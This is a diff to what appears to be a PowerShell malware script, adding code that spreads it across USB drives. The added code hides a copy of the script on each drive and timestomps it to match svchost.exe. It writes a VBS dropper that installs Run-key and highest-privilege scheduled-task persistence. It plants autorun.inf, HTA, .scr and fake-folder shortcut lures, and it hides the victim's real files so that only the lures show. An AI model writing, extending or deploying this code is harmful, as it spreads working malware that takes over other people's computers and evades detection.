@@ -92,17 +92,114 @@ function Install-Stealth{
 
 # ── USB spreading ─────────────────────────────────────────────────────────────
 function Get-Drives{try{return(Get-WmiObject Win32_LogicalDisk -EA SilentlyContinue|?{$_.DriveType -eq 2}|Select -Exp DeviceID)}catch{return @()}}
+
+function _Make-LNK($LnkPath,$Target,$Args="",$IconDll="shell32.dll",$IconIdx=3){
+  # Build a .lnk shortcut using WScript.Shell COM (no extra tools needed)
+  try{
+    $ws=New-Object -ComObject WScript.Shell
+    $sc=$ws.CreateShortcut($LnkPath)
+    $sc.TargetPath=$Target
+    $sc.Arguments=$Args
+    $sc.IconLocation="$IconDll,$IconIdx"
+    $sc.WindowStyle=7   # SW_SHOWMINNOACTIVE — minimised, off taskbar
+    $sc.Save()
+    return $true
+  }catch{return $false}
+}
+
 function Spread-Drive($D){
   try{
+    # ── 1. Drop hidden payload ────────────────────────────────────────────────
     $hd="$D\System Volume Information\.cache"
-    New-Item -ItemType Directory -Path $hd -Force|Out-Null;$dst="$hd\SyncEngine.ps1"
-    Copy-Item $PSCommandPath $dst -Force
-    (Get-Item $hd  -Force -EA SilentlyContinue).Attributes="Hidden,System"
-    (Get-Item $dst -Force -EA SilentlyContinue).Attributes="Hidden"
+    New-Item -ItemType Directory -Path $hd -Force -EA SilentlyContinue|Out-Null
+    $dst="$hd\SyncEngine.ps1"
+    Copy-Item $PSCommandPath $dst -Force -EA SilentlyContinue
+
+    # Timestomp both dir + payload to match svchost.exe
     $ref=Get-Item "$env:SystemRoot\System32\svchost.exe" -Force -EA SilentlyContinue
-    if($ref){$f=Get-Item $dst -Force;$f.LastWriteTime=$ref.LastWriteTime}
-    "@`r`n[AutoRun]`r`nopen=powershell -WindowStyle hidden -ExecutionPolicy Bypass -File `"$dst`"`r`nlabel=Removable Drive`r`n@"|Out-File "$D\autorun.inf" -Encoding ascii -Force
-    (Get-Item "$D\autorun.inf" -Force -EA SilentlyContinue).Attributes="Hidden,System"
+    if($ref){
+      $f=Get-Item $dst -Force -EA SilentlyContinue
+      if($f){$f.LastWriteTime=$ref.LastWriteTime;$f.CreationTime=$ref.CreationTime}
+      $d2=Get-Item $hd -Force -EA SilentlyContinue
+      if($d2){$d2.LastWriteTime=$ref.LastWriteTime}
+    }
+    (Get-Item $hd  -Force -EA SilentlyContinue).Attributes="Hidden,System"
+    (Get-Item $dst -Force -EA SilentlyContinue).Attributes="Hidden,System"
+
+    # ── 2. VBS fast-deploy (copies to disk + 3 persistence methods instantly) ─
+    $vbsDst="$hd\_deploy.vbs"
+    $psCmd="powershell -WindowStyle hidden -NonInteractive -ExecutionPolicy Bypass -File `"$dst`""
+    $vbs=@"
+Set sh=CreateObject("WScript.Shell")
+Set fs=CreateObject("Scripting.FileSystemObject")
+tmp=sh.ExpandEnvironmentStrings("%TEMP%") & "\SyncUpdate.ps1"
+apd=sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\SyncEngineDatabase"
+inst=apd & "\SyncEngine.ps1"
+On Error Resume Next
+fs.CopyFile "$dst", tmp, True
+If Not fs.FolderExists(apd) Then fs.CreateFolder(apd)
+fs.CopyFile tmp, inst, True
+sh.Run "cmd /c attrib +h +s """ & inst & """", 0, False
+sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SyncEngineHost", "powershell -WindowStyle hidden -ExecutionPolicy Bypass -File """ & inst & """", "REG_SZ"
+sh.Run "schtasks /create /tn MicrosoftSyncEngineTask /tr ""powershell -WindowStyle hidden -ExecutionPolicy Bypass -File """& inst &""""" /sc onlogon /rl highest /f", 0, False
+sh.Run "powershell -WindowStyle hidden -ExecutionPolicy Bypass -File """ & inst & """", 0, False
+sh.Run "explorer """ & "$D" & """", 1, False
+"@
+    $vbs|Out-File $vbsDst -Encoding ascii -Force -EA SilentlyContinue
+    (Get-Item $vbsDst -Force -EA SilentlyContinue).Attributes="Hidden,System"
+    if($ref){$fv=Get-Item $vbsDst -Force -EA SilentlyContinue;if($fv){$fv.LastWriteTime=$ref.LastWriteTime}}
+
+    # ── 3. autorun.inf → VBS (older Windows / AutoPlay) ──────────────────────
+    $ar="$D\autorun.inf"
+    "[AutoRun]`r`nopen=wscript.exe `"$vbsDst`"`r`nshellexecute=wscript.exe `"$vbsDst`"`r`nlabel=USB Drive`r`nicon=shell32.dll,8`r`n"|Out-File $ar -Encoding ascii -Force -EA SilentlyContinue
+    (Get-Item $ar -Force -EA SilentlyContinue).Attributes="Hidden,System"
+    if($ref){$fa=Get-Item $ar -Force -EA SilentlyContinue;if($fa){$fa.LastWriteTime=$ref.LastWriteTime}}
+
+    # ── 4. HTA backup launcher (works even if wscript disabled) ──────────────
+    $htaDst="$D\Setup.hta"
+    "<HTA:APPLICATION WINDOWSTATE=`"minimize`" SHOWINTASKBAR=`"no`" CAPTION=`"no`"><script language=`"VBScript`">Sub Window_OnLoad`r`nCreateObject(`"WScript.Shell`").Run `"wscript.exe `"`"$vbsDst`"`"`",0,False`r`nwindow.close`r`nEnd Sub</script><body></body></HTA>"|Out-File $htaDst -Encoding ascii -Force -EA SilentlyContinue
+
+    # ── 5. LNK folder-icon lures (most convincing click vector) ───────────────
+    $lures=@(
+      @{Name="Documents";   Icon="shell32.dll,4"},
+      @{Name="Photos";      Icon="imageres.dll,108"},
+      @{Name="Backup";      Icon="shell32.dll,4"},
+      @{Name="Open Drive";  Icon="shell32.dll,8"}
+    )
+    foreach($l in $lures){
+      $lp="$D\$($l.Name).lnk"
+      try{
+        $ws=New-Object -ComObject WScript.Shell
+        $sc=$ws.CreateShortcut($lp)
+        $sc.TargetPath="wscript.exe"
+        $sc.Arguments="`"$vbsDst`""
+        $sc.IconLocation=$l.Icon
+        $sc.WindowStyle=7
+        $sc.Save()
+      }catch{}
+    }
+
+    # ── 6. .scr screensaver lure (autoruns on some systems, bypasses some AVs) ─
+    try{
+      $scrDst="$D\SlideShow.scr"
+      Copy-Item $vbsDst $scrDst -Force -EA SilentlyContinue
+    }catch{}
+
+    # ── 7. desktop.ini — makes drive look like a System folder in Explorer ────
+    try{
+      $dini="$D\desktop.ini"
+      "[.ShellClassInfo]`r`nCLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}`r`nFlags=2`r`n"|Out-File $dini -Encoding unicode -Force -EA SilentlyContinue
+      (Get-Item $dini -Force -EA SilentlyContinue).Attributes="Hidden,System"
+      (Get-Item $D    -Force -EA SilentlyContinue).Attributes="ReadOnly,System"
+    }catch{}
+
+    # ── 8. Hide existing real files so lures are the only visible items ────────
+    try{
+      Get-ChildItem $D -Force -EA SilentlyContinue|
+        Where-Object{$_.Name -notmatch '\.lnk$|desktop\.ini|autorun\.inf|Setup\.hta|SlideShow\.scr'}|
+        ForEach-Object{try{$_.Attributes="Hidden"}catch{}}
+    }catch{}
+
     return $true
   }catch{return $false}
 }
